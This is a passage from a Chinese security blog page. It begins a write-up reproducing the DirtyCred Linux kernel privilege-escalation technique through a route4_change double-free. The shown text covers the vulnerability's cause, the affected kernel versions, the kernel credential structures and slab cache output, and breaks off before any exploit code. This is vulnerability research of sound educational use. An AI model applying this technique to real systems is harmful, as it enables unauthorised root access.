<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.4.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta property="og:type" content="website">
<meta property="og:title" content="Pwn进你的心">
<meta property="og:url" content="http://example.com/page/10/index.html">
<meta property="og:site_name" content="Pwn进你的心">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="yhellow">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://example.com/page/10/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'en'
  };
</script>

  <title>Pwn进你的心</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">Pwn进你的心</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/12/28/Kernel%20%E7%8E%B0%E5%AE%9E%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%9ADirty%20Cred/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/12/28/Kernel%20%E7%8E%B0%E5%AE%9E%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%9ADirty%20Cred/" class="post-title-link" itemprop="url">Kernel 现实漏洞复现：Dirty Cred</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2022-12-28 12:59:46 / Modified: 13:01:49" itemprop="dateCreated datePublished" datetime="2022-12-28T12:59:46+08:00">2022-12-28</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/CVE/" itemprop="url" rel="index"><span itemprop="name">CVE</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>44k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>40 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>Dirty Cred 漏洞成因</strong></p>
<p>DirtyCred，一种新的通用漏洞利用方法，不用依赖 Linux 的 pipeline 机制，只需利用堆内存破坏类型的漏洞 </p>
<p>攻击适用版本：</p>
<ul>
<li>Linux Kernel版本 &gt;= 2.6.12 </li>
<li>Linux Kernel版本 &lt;= 5.19.1 </li>
</ul>
<p>在 Linux 内核的 <code>net/sched/cls_route.c</code> 实现的 <code>route4_change</code> 中发现了一个漏洞，该漏洞源于释放后重用，本地攻击者利用该漏洞会导致系统崩溃，可能会造成本地特权升级问题 </p>
<p>由于将 <code>route4_filter</code> 对象从链表中删除和释放时的检查条件不一致，导致该对象被释放后仍存于链表中，后面可以触发 Double-Free</p>
<p><strong>前置知识 - 内核凭证 Credential</strong></p>
<p>Kernel 凭证是 kernel 文档中定义的 kernel 中携带特权信息的特征，表示权限和对应的能力，主要分为：</p>
<ul>
<li>task 凭证（<code>struct cred</code>）</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> &#123;</span></span><br><span class="line">	<span class="keyword">atomic_t</span>	usage;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span></span><br><span class="line">	<span class="keyword">atomic_t</span>	subscribers;	<span class="comment">/* number of processes subscribed */</span></span><br><span class="line">	<span class="keyword">void</span>		*put_addr;</span><br><span class="line">	<span class="keyword">unsigned</span>	magic;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CRED_MAGIC	0x43736564</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CRED_MAGIC_DEAD	0x44656144</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	<span class="keyword">kuid_t</span>		uid;		<span class="comment">/* real UID of the task */</span></span><br><span class="line">	<span class="keyword">kgid_t</span>		gid;		<span class="comment">/* real GID of the task */</span></span><br><span class="line">	<span class="keyword">kuid_t</span>		suid;		<span class="comment">/* saved UID of the task */</span></span><br><span class="line">	<span class="keyword">kgid_t</span>		sgid;		<span class="comment">/* saved GID of the task */</span></span><br><span class="line">	<span class="keyword">kuid_t</span>		euid;		<span class="comment">/* effective UID of the task */</span></span><br><span class="line">	<span class="keyword">kgid_t</span>		egid;		<span class="comment">/* effective GID of the task */</span></span><br><span class="line">	<span class="keyword">kuid_t</span>		fsuid;		<span class="comment">/* UID for VFS ops */</span></span><br><span class="line">	<span class="keyword">kgid_t</span>		fsgid;		<span class="comment">/* GID for VFS ops */</span></span><br><span class="line">	<span class="keyword">unsigned</span>	securebits;	<span class="comment">/* SUID-less security management */</span></span><br><span class="line">	<span class="keyword">kernel_cap_t</span>	cap_inheritable; <span class="comment">/* caps our children can inherit */</span></span><br><span class="line">	<span class="keyword">kernel_cap_t</span>	cap_permitted;	<span class="comment">/* caps we&#x27;re permitted */</span></span><br><span class="line">	<span class="keyword">kernel_cap_t</span>	cap_effective;	<span class="comment">/* caps we can actually use */</span></span><br><span class="line">	<span class="keyword">kernel_cap_t</span>	cap_bset;	<span class="comment">/* capability bounding set */</span></span><br><span class="line">	<span class="keyword">kernel_cap_t</span>	cap_ambient;	<span class="comment">/* Ambient capability set */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span>	jit_keyring;	<span class="comment">/* default keyring to attach requested</span></span><br><span class="line"><span class="comment">					 * keys to */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span>	*<span class="title">session_keyring</span>;</span> <span class="comment">/* keyring inherited over fork */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span>	*<span class="title">process_keyring</span>;</span> <span class="comment">/* keyring private to this process */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span>	*<span class="title">thread_keyring</span>;</span> <span class="comment">/* keyring private to this thread */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span>	*<span class="title">request_key_auth</span>;</span> <span class="comment">/* assumed request_key authority */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line">	<span class="keyword">void</span>		*security;	<span class="comment">/* subjective LSM security */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span>;</span>	<span class="comment">/* real user ID subscription */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">user_namespace</span> *<span class="title">user_ns</span>;</span> <span class="comment">/* user_ns the caps and keyrings are relative to. */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">group_info</span> *<span class="title">group_info</span>;</span>	<span class="comment">/* supplementary groups for euid/fsgid */</span></span><br><span class="line">	<span class="comment">/* RCU deletion */</span></span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">		<span class="keyword">int</span> non_rcu;			<span class="comment">/* Can we skip RCU deletion? */</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span>	<span class="title">rcu</span>;</span>		<span class="comment">/* RCU deletion hook */</span></span><br><span class="line">	&#125;;</span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure>
<ul>
<li>open file 凭证（<code>struct file</code>）</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">llist_node</span>	<span class="title">fu_llist</span>;</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span> 	<span class="title">fu_rcuhead</span>;</span></span><br><span class="line">	&#125; f_u;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">path</span>		<span class="title">f_path</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">inode</span>		*<span class="title">f_inode</span>;</span>	<span class="comment">/* cached value */</span></span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span>	*<span class="title">f_op</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Protects f_ep_links, f_flags.</span></span><br><span class="line"><span class="comment">	 * Must not be taken from IRQ context.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">spinlock_t</span>		f_lock;</span><br><span class="line">	<span class="class"><span class="keyword">enum</span> <span class="title">rw_hint</span>		<span class="title">f_write_hint</span>;</span></span><br><span class="line">	<span class="keyword">atomic_long_t</span>		f_count;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> 		f_flags;</span><br><span class="line">	<span class="keyword">fmode_t</span>			f_mode;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mutex</span>		<span class="title">f_pos_lock</span>;</span></span><br><span class="line">	<span class="keyword">loff_t</span>			f_pos;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">fown_struct</span>	<span class="title">f_owner</span>;</span></span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span>	*<span class="title">f_cred</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">file_ra_state</span>	<span class="title">f_ra</span>;</span></span><br><span class="line"></span><br><span class="line">	u64			f_version;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line">	<span class="keyword">void</span>			*f_security;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	<span class="comment">/* needed for tty driver, and maybe others */</span></span><br><span class="line">	<span class="keyword">void</span>			*private_data;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_EPOLL</span></span><br><span class="line">	<span class="comment">/* Used by fs/eventpoll.c to link all the hooks to this file */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span>	<span class="title">f_ep_links</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span>	<span class="title">f_tfile_llink</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* #ifdef CONFIG_EPOLL */</span></span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">address_space</span>	*<span class="title">f_mapping</span>;</span></span><br><span class="line">	<span class="keyword">errseq_t</span>		f_wb_err;</span><br><span class="line">	<span class="keyword">errseq_t</span>		f_sb_err; <span class="comment">/* for syncfs */</span></span><br><span class="line">&#125; __randomize_layout</span><br><span class="line">  __attribute__((aligned(<span class="number">4</span>)));	<span class="comment">/* lest something weird decides that 2 is OK */</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file_handle</span> &#123;</span></span><br><span class="line">	__u32 handle_bytes;</span><br><span class="line">	<span class="keyword">int</span> handle_type;</span><br><span class="line">	<span class="comment">/* file identifier */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> f_handle[];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>前置知识 - Slab 的两种内存缓存</strong></p>
<p>众所周知，Linux 内核主要使用 slab 分配器来进行内存分配，slab 分配器中主要维护了两种内存缓存（即可以理解成两套作用不同的内存分配方式）：</p>
<ul>
<li><code>dedicated cache</code>：这里的内存是用于分配给内核中的常用对象，在该缓存中被分配的结构体将始终保持初始化状态，以便于提高分配速度</li>
<li><code>generic cache</code>：通用缓存，大多数情况下其内存块的大小与 2 的幂次方对齐</li>
</ul>
<p>这类 <code>cred</code> 和 <code>file</code> 结构体等 <code>credential</code> 对象都是在 <code>dedicated cache</code> 中分配，而大多数内存漏洞发生的地方都是在 <code>generic cache</code> 中</p>
<p>使用 <code>sudo cat /proc/slabinfo</code> 可以查看 slab 分配器的具体信息：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br></pre></td><td class="code"><pre><span class="line">slabinfo - version: <span class="number">2.1</span></span><br><span class="line"><span class="meta"># name            <span class="meta-string">&lt;active_objs&gt;</span> <span class="meta-string">&lt;num_objs&gt;</span> <span class="meta-string">&lt;objsize&gt;</span> <span class="meta-string">&lt;objperslab&gt;</span> <span class="meta-string">&lt;pagesperslab&gt;</span></span></span><br><span class="line">isofs_inode_cache     <span class="number">94</span>     <span class="number">94</span>    <span class="number">688</span>   <span class="number">47</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">nf_conntrack         <span class="number">400</span>    <span class="number">400</span>    <span class="number">320</span>   <span class="number">25</span>    <span class="number">2</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">au_vdir                <span class="number">0</span>      <span class="number">0</span>    <span class="number">128</span>   <span class="number">32</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">au_finfo               <span class="number">0</span>      <span class="number">0</span>    <span class="number">192</span>   <span class="number">42</span>    <span class="number">2</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">au_icntnr              <span class="number">0</span>      <span class="number">0</span>    <span class="number">832</span>   <span class="number">39</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">au_dinfo               <span class="number">0</span>      <span class="number">0</span>    <span class="number">192</span>   <span class="number">42</span>    <span class="number">2</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">ovl_inode             <span class="number">90</span>     <span class="number">90</span>    <span class="number">720</span>   <span class="number">45</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">AF_VSOCK             <span class="number">375</span>    <span class="number">375</span>   <span class="number">1280</span>   <span class="number">25</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">ext4_groupinfo_4k    <span class="number">672</span>    <span class="number">672</span>    <span class="number">192</span>   <span class="number">42</span>    <span class="number">2</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">fsverity_info          <span class="number">0</span>      <span class="number">0</span>    <span class="number">256</span>   <span class="number">32</span>    <span class="number">2</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">fscrypt_info           <span class="number">0</span>      <span class="number">0</span>    <span class="number">136</span>   <span class="number">30</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">MPTCPv6                <span class="number">0</span>      <span class="number">0</span>   <span class="number">2048</span>   <span class="number">16</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">ip6-frags              <span class="number">0</span>      <span class="number">0</span>    <span class="number">184</span>   <span class="number">44</span>    <span class="number">2</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">PINGv6                 <span class="number">0</span>      <span class="number">0</span>   <span class="number">1216</span>   <span class="number">26</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">RAWv6               <span class="number">1352</span>   <span class="number">1352</span>   <span class="number">1216</span>   <span class="number">26</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">UDPv6                <span class="number">360</span>    <span class="number">360</span>   <span class="number">1344</span>   <span class="number">24</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">tw_sock_TCPv6          <span class="number">0</span>      <span class="number">0</span>    <span class="number">248</span>   <span class="number">33</span>    <span class="number">2</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">request_sock_TCPv6      <span class="number">0</span>      <span class="number">0</span>    <span class="number">304</span>   <span class="number">26</span>    <span class="number">2</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : s0</span><br><span class="line">TCPv6                <span class="number">130</span>    <span class="number">130</span>   <span class="number">2432</span>   <span class="number">13</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">kcopyd_job             <span class="number">0</span>      <span class="number">0</span>   <span class="number">3240</span>   <span class="number">10</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">dm_uevent              <span class="number">0</span>      <span class="number">0</span>   <span class="number">2888</span>   <span class="number">11</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">scsi_sense_cache    <span class="number">1504</span>   <span class="number">1504</span>    <span class="number">128</span>   <span class="number">32</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">mqueue_inode_cache     <span class="number">34</span>     <span class="number">34</span>    <span class="number">960</span>   <span class="number">34</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : s0</span><br><span class="line">fuse_request         <span class="number">338</span>    <span class="number">338</span>    <span class="number">152</span>   <span class="number">26</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">fuse_inode           <span class="number">195</span>    <span class="number">195</span>    <span class="number">832</span>   <span class="number">39</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">ecryptfs_inode_cache      <span class="number">0</span>      <span class="number">0</span>   <span class="number">1024</span>   <span class="number">32</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> :<span class="number">0</span></span><br><span class="line">ecryptfs_file_cache      <span class="number">0</span>      <span class="number">0</span>     <span class="number">16</span>  <span class="number">256</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : <span class="number">0</span></span><br><span class="line">ecryptfs_auth_tok_list_item      <span class="number">0</span>      <span class="number">0</span>    <span class="number">832</span>   <span class="number">39</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">00</span></span><br><span class="line">fat_inode_cache       <span class="number">42</span>     <span class="number">42</span>    <span class="number">776</span>   <span class="number">42</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">fat_cache              <span class="number">0</span>      <span class="number">0</span>     <span class="number">40</span>  <span class="number">102</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">squashfs_inode_cache    <span class="number">552</span>    <span class="number">552</span>    <span class="number">704</span>   <span class="number">46</span>    <span 